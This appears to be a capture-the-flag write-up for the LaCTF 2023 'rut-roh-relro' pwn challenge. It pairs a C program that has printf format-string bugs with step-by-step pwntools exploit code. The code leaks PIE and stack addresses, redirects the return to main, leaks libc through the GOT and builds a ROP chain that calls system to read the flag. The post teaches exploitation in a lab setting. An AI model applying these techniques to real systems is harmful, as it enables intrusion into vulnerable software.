---
layout: post
title: "LaCTF 2023 - rut-roh-relro [Pwn]"
categories: ctf
tags: pwn ikerl
date: 2023-02-12 23:00:00 +0100
author: ikerl
---

For this challenge, we are given a compiled ELF file and its corresponding C source code. The program has two critical format string vulnerabilities, which enable an attacker to easily read and write memory. Despite being compiled with Full RELRO and PIE, making exploitation more difficult, and hosted on a server with strict execution policies, making it difficult to execute certain commands such as `/bin/sh`, the challenge remains to exploit the vulnerabilities present.

The context of the challenge is as follows:

```
My friend keeps writing super insecure C programs but I'm too lazy to fix his code. I'm sure it'll be fine as long as I use enough exploit mitigations, right?
```

## Source code analysis

This is the complete source code of the vulnerable program:

```c
#include <stdio.h>

int main(void) {
    setbuf(stdout, NULL);
    puts("What would you like to post?");
    char buf[512];
    fgets(buf, 512, stdin);
    printf("Here's your latest post:\n");
    printf(buf);
    printf("\nWhat would you like to post?\n");
    fgets(buf, 512, stdin);
    printf(buf);
    printf("\nYour free trial has expired. Bye!\n");
    return 0;
}

```

The program has two vulnerable printf calls that directly execute user input, making them easily exploitable through format string abuse techniques. While finding the vulnerability is straightforward, the real challenge lies in exploiting it to bypass PIE and Full RELRO memory protections and read the flag without relying on `/bin/sh` or similars. In the next section, we will explain how to use these vulnerabilities to achieve this goal.


## Exploitation

The exploitation process can be broken down into the following steps:

- Abusing the first vulnerable printf call to obtain the address of the executable and a stack leak. This allows us to bypass the PIE memory protection and determine the base address of the executable. The stack address leak is also useful in the next step.
- Using the second printf call, we need to modify the return address by replacing it with the address of the main function. This way, the program will not terminate, and we will have two additional vulnerable printf executions.
- In the third call of the vulnerable printf, we locate the addresses of the printf and puts functions by reading the Global Offset Table (GOT). This information enables us to identify the version of libc used by the server and determine the base address of libc.
- Finally, we place the string ``cat f*`` on the stack and call the ``system`` function from libc, thereby reading the flag.

### Leaking the executables base address and the stack

By reading the addresses located at positions 63 and 88 of printf we are able to determine the address of the main function of the executable and the address of the stack.

```python
if LOCAL:
    io = process("./rut_roh_relro")
else:
    io = remote("lac.tf", 31134)

io.recvline()
io.sendline(b"%63$p::%88$p")

io.recvuntil(b"post:")
io.recvline()

leak = io.recvline().replace(b"\n",b"").split(b"::")

leak_pie = int(leak[0].replace(b"0x",b""),16)-0x100
leak_stack = int(leak[1].replace(b"0x",b""),16)
print("ret_address",hex(leak_stack-240))

elf_base = leak_pie-elf.symbols["main"]
print("elf_base",hex(elf_base))
print("main",hex(leak_pie))
```

### Patching program to return main function instead exit

We can calculate the return address by subtracting 240 from the leak obtained in the previous step. By replacing this return address with the address of the main function of the executable, we will jump back to the beginning of the program instead of exiting it.

```python
context.clear(arch = 'amd64')

payload_ret_main = fmtstr_payload(6, {leak_stack-240: leak_pie}, write_size='short')
io.sendline(payload_ret_main)
io.recvuntil(b"Bye!")
```

### Leaking libc version and breaking ASLR

We utilize the third vulnerable printf call to leak the addresses of the printf and puts functions from libc by reading the Global Offset Table (GOT). This allows us to identify the version of libc, determine the base address of libc, and completely bypass the Address Space Layout Randomization (ASLR) memory mitigation

```python
printf_got = leak_pie-elf.symbols["main"]+elf.got["printf"]
puts_got = leak_pie-elf.symbols["main"]+elf.got["puts"]

print("printf_got",hex(printf_got))
print("puts_got",hex(puts_got))

payload_libc_leaks = b"::%8$s::%9$s::::" + p64(printf_got)+p64(puts_got)

io.recvuntil(b"post?")

io.sendline(payload_libc_leaks)

leaks = io.recvuntil(b"post?").split(b"::")

leak_printf = int.from_bytes(leaks[1],"little")
leak_puts = int.from_bytes(leaks[2],"little")
print("leak printf",hex(leak_printf))
print("leak puts",hex(leak_puts))

libc.address = leak_printf - libc.symbols["printf"]
```

### Loading command in the stack and reading the flag

Finally, we create a small Return-Oriented Programming (ROP) chain using the fourth vulnerable printf. The steps are as follows:

- Write the string cat `f*` at a known address on the stack.
- Overwrite the return address with the `pop rdi; ret` gadget, which will set the rdi register to point to the string `cat f*`.
- Execute the `pop rsi; pop r15; ret` gadget to clear the rsi register.
- Call the `system` function, passing `cat f*` as an argument, to read the flag.

```python
# Libc gadgets:
# 0x0000000000026796 : pop rdi ; ret

# Executable gadgets:
# 0x0000000000001279 : pop rsi ; pop r15 ; ret

payload_pwn = fmtstr_payload(6, {leak_stack-240+8: libc.address+0x26796, leak_stack-240+8+8: leak_stack-240+8+8+8+8+8+8+8, leak_stack-240+8+8+8: elf_base+0x1279, leak_stack-240+8+8+8+8: 0, leak_stack-240+8+8+8+8+8: 0, leak_stack-240+8+8+8+8+8+8: libc.symbols["system"], leak_stack-240+8+8+8+8+8+8+8: 0x2a6620746163}, write_size='short')
io.sendline(payload_pwn)

io.recvuntil(b"Bye!")

io.interactive()
```

Flag: `lactf{maybe_ill_add_asan_for_good_measure}`